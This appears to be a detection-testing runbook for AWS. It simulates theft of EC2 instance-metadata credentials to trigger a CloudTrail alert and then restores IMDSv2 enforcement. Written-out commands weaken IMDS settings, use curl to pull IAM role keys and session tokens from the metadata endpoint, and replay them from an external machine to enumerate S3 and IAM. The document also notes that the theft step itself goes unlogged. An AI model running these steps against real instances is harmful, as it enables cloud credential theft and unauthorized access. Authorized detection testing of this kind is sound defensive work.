# CDET-007 — Simulation Steps: EC2 Instance Metadata Credential Abuse

## Overview

This simulation requires two phases:
1. **Credential Retrieval** — performed ON an EC2 instance to retrieve IMDS credentials
2. **External Use** — performed on an EXTERNAL machine using the stolen credentials

Step 1 requires SSH access to an EC2 instance with an IAM role attached. Step 2 can be performed from any external machine (laptop, VPS, etc.) that is NOT the same EC2 instance.

---

## Prerequisites

- An EC2 instance running in your test environment
- The instance must have an IAM role attached (instance profile)
- SSH access to the instance
- The instance should have IMDSv1 enabled (or temporarily enabled for testing — see Step 0)
- A second machine (external to AWS, or a different EC2 instance in a different account) for Step 2

---

## Step 0: Check and Configure IMDS Version

Perform this on the EC2 instance OR via the AWS CLI from a management machine.

```bash
# Check current IMDS settings for an instance
export INSTANCE_ID="i-1234567890abcdef0"  # Replace with your test instance ID

aws ec2 describe-instances \
  --instance-ids "$INSTANCE_ID" \
  --query 'Reservations[].Instances[].MetadataOptions' \
  --output json

# Expected output:
# [
#     {
#         "State": "applied",
#         "HttpTokens": "optional",    ← IMDSv1 is allowed when "optional"
#         "HttpPutResponseHopLimit": 1,
#         "HttpEndpoint": "enabled",
#         "HttpProtocolIpv6": "disabled",
#         "InstanceMetadataTags": "disabled"
#     }
# ]

# If HttpTokens is "required", temporarily switch to "optional" for the test
# WARNING: This enables IMDSv1, making the instance vulnerable to SSRF-based credential theft
aws ec2 modify-instance-metadata-options \
  --instance-id "$INSTANCE_ID" \
  --http-tokens optional \
  --http-endpoint enabled

# Confirm the change
aws ec2 describe-instances \
  --instance-ids "$INSTANCE_ID" \
  --query 'Reservations[].Instances[].MetadataOptions.HttpTokens' \
  --output text
```

## Step 1: Retrieve Credentials FROM the EC2 Instance

**SSH into the target EC2 instance**, then run:

```bash
# Discover available instance profile role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Expected output:
# MyApplicationRole

# Retrieve the credentials for that role
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"

# Expected output (JSON):
# {
#   "Code" : "Success",
#   "LastUpdated" : "2026-06-16T00:00:00Z",
#   "Type" : "AWS-HMAC",
#   "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXXX",
#   "SecretAccessKey" : "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
#   "Token" : "VERY_LONG_SESSION_TOKEN_STRING...",
#   "Expiration" : "2026-06-16T06:00:00Z"
# }

# Note: In a real attack, the adversary would exfiltrate these three values
# (AccessKeyId, SecretAccessKey, Token) to their external machine
```

**No CloudTrail event is generated by the metadata service request itself** — IMDS calls are local and not logged. The first CloudTrail event appears when the credentials are *used*.

## Step 2: Verify IMDSv2 Availability (Preferred Testing)

```bash
# Test IMDSv2 token request (from the EC2 instance)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use the token to get credentials
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# If IMDSv2 is required (HttpTokens=required), the PUT request is needed
# If IMDSv1 is disabled, the curl without the token header will return 401
```

## Step 3: Use Credentials on an External Machine (DETECTION TRIGGER)

**On a DIFFERENT machine that is NOT the EC2 instance** (e.g., your laptop):

```bash
# Set the stolen credentials as environment variables
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="stolen-secret-key"
export AWS_SESSION_TOKEN="stolen-session-token"

# Step 3a: Verify the credentials work (generates GetCallerIdentity CloudTrail event)
aws sts get-caller-identity

# Expected output:
# {
#     "UserId": "AROAXXXXXXXXXXXXXXXXX:i-1234567890abcdef0",
#     "Account": "123456789012",
#     "Arn": "arn:aws:sts::123456789012:assumed-role/MyApplicationRole/i-1234567890abcdef0"
# }
# Note: The UserId contains the instance ID — this ties the credentials to the original EC2 instance

# Step 3b: Enumerate S3 buckets (generates ListBuckets CloudTrail event from EXTERNAL IP)
aws s3 ls

# Step 3c: Check IAM permissions
aws iam get-role --role-name "MyApplicationRole" 2>/dev/null || echo "Access denied to IAM"
```

**The CloudTrail events from Step 3 will show:**
- `userIdentity.type = "AssumedRole"`
- `userIdentity.sessionContext.sessionIssuer.userName = "MyApplicationRole"`
- `sourceIPAddress = YOUR_EXTERNAL_IP` (not the EC2 instance's IP)

This is the detection trigger for CDET-007.

---

## Step 4: Verify Detection

**From your management machine (AWS CLI with normal credentials)**:

```bash
# Query for the external-IP API calls from the instance role
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity \
  --start-time $(date -u -d '30 minutes ago' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -v-30M +%Y-%m-%dT%H:%M:%SZ) \
  --output json | python3 -c "
import json, sys
events = json.load(sys.stdin)['Events']
for e in events:
    ct = json.loads(e['CloudTrailEvent'])
    uid = ct.get('userIdentity', {})
    if uid.get('type') == 'AssumedRole':
        print(f\"Time: {e['EventTime']}\")
        print(f\"Source IP: {ct['sourceIPAddress']}\")
        print(f\"Role ARN: {uid.get('sessionContext', {}).get('sessionIssuer', {}).get('arn', 'N/A')}\")
        print()
"
```

## Step 5: Restore IMDSv2 Enforcement

**Critical remediation step** — re-enforce IMDSv2 after testing:

```bash
# WARNING: This modifies instance metadata options to require IMDSv2.
# This is a security improvement but may break applications that use IMDSv1.
aws ec2 modify-instance-metadata-options \
  --instance-id "$INSTANCE_ID" \
  --http-tokens required \
  --http-endpoint enabled

# Verify IMDSv2 is now required
aws ec2 describe-instances \
  --instance-ids "$INSTANCE_ID" \
  --query 'Reservations[].Instances[].MetadataOptions' \
  --output json

echo "IMDSv2 is now required for instance: $INSTANCE_ID"
```

## Account-Wide IMDSv2 Enforcement

To require IMDSv2 for all new instances in the account:

```bash
# Set account-level default to require IMDSv2 for all NEW instances
aws ec2 modify-instance-metadata-defaults \
  --http-tokens required \
  --region us-east-1

# Verify the account-level setting
aws ec2 get-instance-metadata-defaults --region us-east-1

# Enumerate existing instances that still use IMDSv1
aws ec2 describe-instances \
  --filters "Name=metadata-options.http-tokens,Values=optional" \
  --query 'Reservations[].Instances[].{ID:InstanceId, HttpTokens:MetadataOptions.HttpTokens}' \
  --output table
```
